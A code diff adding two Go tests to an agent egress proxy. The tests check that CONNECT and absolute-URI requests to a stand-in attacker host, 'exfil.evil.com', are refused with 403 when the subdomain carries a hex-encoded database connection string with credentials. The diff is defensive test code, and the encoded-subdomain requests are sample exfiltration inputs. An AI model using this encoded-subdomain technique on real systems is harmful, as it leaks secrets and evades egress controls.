@@ -626,6 +626,34 @@ func TestConnectBlockedDomain(t *testing.T) {
 	}
 }
 
+// TestConnectBlocksEncodedSubdomainExfil proves transport parity: hostname
+// exfiltration via hex/base32-encoded subdomain labels is blocked on the
+// CONNECT forward path, not just the /fetch path. Mirrors the agent-egress-bench
+// hostname_exfiltration http_proxy case (mixed-encoding subdomains).
+func TestConnectBlocksEncodedSubdomainExfil(t *testing.T) {
+	proxyAddr, cleanup := setupForwardProxy(t, nil)
+	defer cleanup()
+
+	conn := dialProxy(t, proxyAddr)
+	defer func() { _ = conn.Close() }()
+
+	// Long hex label in the subdomain — the encoded-exfil signal fires at
+	// layer 5 (before DNS/SSRF), so this never reaches the network.
+	target := "706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com:443"
+	_, _ = fmt.Fprintf(conn, "CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", target, target)
+
+	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
+	if err != nil {
+		t.Fatalf("read response: %v", err)
+	}
+	body, _ := io.ReadAll(resp.Body)
+	_ = resp.Body.Close()
+
+	if resp.StatusCode != http.StatusForbidden {
+		t.Errorf("expected 403 for encoded-subdomain CONNECT, got %d (body: %s)", resp.StatusCode, body)
+	}
+}
+
 func TestConnectAuditMode(t *testing.T) {
 	echoLn := listenEcho(t)
 	defer func() { _ = echoLn.Close() }()
@@ -792,6 +820,23 @@ func TestForwardHTTPBlockedDomain(t *testing.T) {
 	if resp.StatusCode != http.StatusForbidden {
 		body, _ := io.ReadAll(resp.Body)
 		t.Errorf("expected 403, got %d (body: %s)", resp.StatusCode, body)
+	}
+}
+
+// TestForwardHTTPBlocksEncodedSubdomainExfil proves transport parity for the
+// absolute-URI forward path: an encoded-subdomain exfil target is blocked at
+// the scan (pre-dial), matching the fetch and CONNECT paths.
+func TestForwardHTTPBlocksEncodedSubdomainExfil(t *testing.T) {
+	proxyAddr, cleanup := setupForwardProxy(t, nil)
+	defer cleanup()
+
+	client := proxyClient(proxyAddr)
+	resp := doGet(t, client, "http://706f7374677265733a2f2f757365723a70617373406462.exfil.evil.com/leak")
+	defer func() { _ = resp.Body.Close() }()
+
+	if resp.StatusCode != http.StatusForbidden {
+		body, _ := io.ReadAll(resp.Body)
+		t.Errorf("expected 403 for encoded-subdomain absolute-URI request, got %d (body: %s)", resp.StatusCode, body)
 	}
 }
 
